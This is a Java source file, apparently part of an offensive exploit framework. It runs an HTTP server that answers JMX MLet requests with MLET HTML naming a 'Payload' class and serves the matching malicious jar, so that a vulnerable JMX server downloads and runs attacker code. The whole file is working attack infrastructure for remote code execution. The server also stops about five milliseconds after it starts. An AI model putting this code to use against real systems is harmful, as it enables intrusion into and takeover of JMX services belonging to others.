package com.lucifaer.jokerframework.server.http;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.concurrent.*;

public class JokerHttpServer {
    private static final ExecutorService es = Executors.newCachedThreadPool();
    private int port = 9999;

    public static void create() {
        try {
            es.execute(new httpThread());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            es.shutdown();
        }
    }

    private static class httpThread extends Thread {
        @Override
        public void run() {
            try {
                HttpServer server = HttpServer.create(new InetSocketAddress(9999), 0);
                server.createContext("/", new MyHandler());
                server.setExecutor(null);
                server.start();
                Thread.sleep(5);
                server.stop(1);
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }

        static class MyHandler implements HttpHandler {
            @Override
            public void handle(HttpExchange httpExchange) throws IOException {
                if (httpExchange.getRequestURI().toString().endsWith("/")) {
                    String mlet_code = "<HTML>\n" +
                            "<MLET\n" +
                            "  CODE=com.lucifaer.jjet.payload.Payload\n" +
                            "  ARCHIVE=jmx-server.main.jar\n" +
                            "  NAME=Payload:name=payload,id=1\n" +
                            "  CODEBASE=http://127.0.0.1:9999>\n" +
                            "</MLET>\n" +
                            "</HTML>";
                    httpExchange.sendResponseHeaders(200, mlet_code.length());
                    OutputStream os = httpExchange.getResponseBody();
                    os.write(mlet_code.getBytes());
                    os.close();
                }
                else if (httpExchange.getRequestURI().toString().endsWith(".jar")) {
                    File file = new File("/Users/Lucifaer/Dropbox/漏洞利用/jmx-server/out/artifacts/jmx_server_main_jar2/jmx-server.main.jar");
                    httpExchange.sendResponseHeaders(200, file.length());
                    httpExchange.getResponseHeaders().set("Content-Type", "application/jar, charset=UTF-8");
                    OutputStream os = httpExchange.getResponseBody();
                    FileInputStream fis = new FileInputStream(file);
                    byte[] data = new byte[fis.available()];
                    fis.read(data);
                    os.write(data);
                    os.close();
                    fis.close();
                }
                else {
                    String not_found = "File not found";
                    OutputStream os = httpExchange.getResponseBody();
                    httpExchange.sendResponseHeaders(404, 0);
                    os.write(not_found.getBytes());
                    os.close();
                }
            }
        }
    }

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }
}
